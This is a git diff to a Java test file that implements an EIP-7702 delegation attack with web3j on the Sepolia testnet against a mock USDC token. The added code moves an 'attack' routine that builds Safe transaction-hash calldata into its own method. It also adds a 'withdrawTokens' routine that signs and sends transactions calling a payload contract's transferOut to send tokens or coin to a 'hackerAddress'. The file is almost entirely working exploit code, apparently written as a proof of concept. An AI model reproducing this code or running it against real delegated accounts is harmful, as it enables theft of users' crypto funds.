@@ -6,8 +6,10 @@ import org.web3j.abi.FunctionEncoder;
 import org.web3j.abi.datatypes.Address;
 import org.web3j.abi.datatypes.Function;
 import org.web3j.abi.datatypes.Type;
+import org.web3j.abi.datatypes.generated.Uint256;
 import org.web3j.crypto.Credentials;
 import org.web3j.crypto.Hash;
+import org.web3j.crypto.RawTransaction;
 import org.web3j.crypto.Sign;
 import org.web3j.protocol.Web3j;
 import org.web3j.protocol.core.DefaultBlockParameterName;
@@ -31,7 +33,7 @@ public class Eip7702Test {
 //    static String safeContractAddress = "0xEbf288a3C20C2551d42481242D0cA1D8826D20d6";
 
     static String payloadContractAddress = "0xE03aA9F507B91164Cc044A33796f3A5146463a6c";
-    static String signerAddress = "0xe5a7b0c16127f81530352bdce6d5a6c7b07db4ec";
+    static String signerAddress = "0x41ea3ba3c6fe1eae27f37a8222c735b88b0a79d1";
     static String tokenAddress = "0x92cab42fa3f3b63c5f5f2e1ad3334ef927a9588f"; // mock usdc
 
     static long chainId = 11155111L;
@@ -42,6 +44,52 @@ public class Eip7702Test {
 
     public static void main(String[] args) throws Exception {
 
+        //
+//        attack();
+
+        //
+//        withdrawTokens(true);
+
+        //
+        withdrawTokens(false);
+    }
+
+    public static void withdrawTokens(Boolean isCoin) throws Exception {
+        // load 私钥
+        Map<String, String> privateKeyPairs = loadPrivateKeyPairsFromLocalFile();
+
+        // load rpc url
+        Web3j web3j = Web3j.build(new HttpService(loadHttpRpcUrlFromLocalFile().get(chainId).get(0)));
+
+        // 构造calldata
+        BigInteger transferAmount = new BigInteger("1000000");
+        String callData = buildPayloadTransferCallData(hackerAddress, isCoin ? "0x0000000000000000000000000000000000000000" : tokenAddress, transferAmount);
+
+        //
+        final BigInteger maxTipFee = web3j.ethMaxPriorityFeePerGas().send().getMaxPriorityFeePerGas();
+        final BigInteger maxFee = maxTipFee.add(baseFeeEstimated);
+
+        // 构造payload交易
+        RawTransaction payloadTx = RawTransaction.createTransaction(
+                chainId,
+                web3j.ethGetTransactionCount(hackerAddress, DefaultBlockParameterName.LATEST).send().getTransactionCount(),
+                BigInteger.valueOf(300000),
+                signerAddress,
+                BigInteger.ZERO,
+                callData,
+                maxTipFee,
+                maxFee
+        );
+
+        // 签名payload交易
+        String signedTransaction = signRawTransaction(privateKeyPairs, hackerAddress, payloadTx);
+
+        // 发送交易
+        String txHashSent = web3j.ethSendRawTransaction(signedTransaction).send().getTransactionHash();
+        System.out.println(txHashSent);
+    }
+
+    private static void attack() throws Exception {
         // load 私钥
         Map<String, String> privateKeyPairs = loadPrivateKeyPairsFromLocalFile();
 
@@ -98,8 +146,8 @@ public class Eip7702Test {
         } else {
             System.out.println(result.getError().getMessage());
         }
-
     }
+
 
     private static String buildAttackSafeTxHashCallData(String payloadContractAddress, String ownerAddress) {
         // 构造input param
@@ -131,5 +179,16 @@ public class Eip7702Test {
         // 拼装完整的交易上链bytes
         byte[] signedTxBytes = com.tc.test.eip7702.TransactionEncoder.encode(rawTransaction, signatureData);
         return Numeric.toHexString(signedTxBytes);
+    }
+
+    private static String buildPayloadTransferCallData(String hackerAddress, String tokenAddress, BigInteger amount) {
+        // 构造input param
+        List<Type> inputParameters = new ArrayList<>();
+        inputParameters.add(new Address(tokenAddress));
+        inputParameters.add(new Address(hackerAddress));
+        inputParameters.add(new Uint256(amount));
+        // 构造function数据
+        Function function = new Function("transferOut", inputParameters, Collections.emptyList());
+        return FunctionEncoder.encode(function);
     }
 }
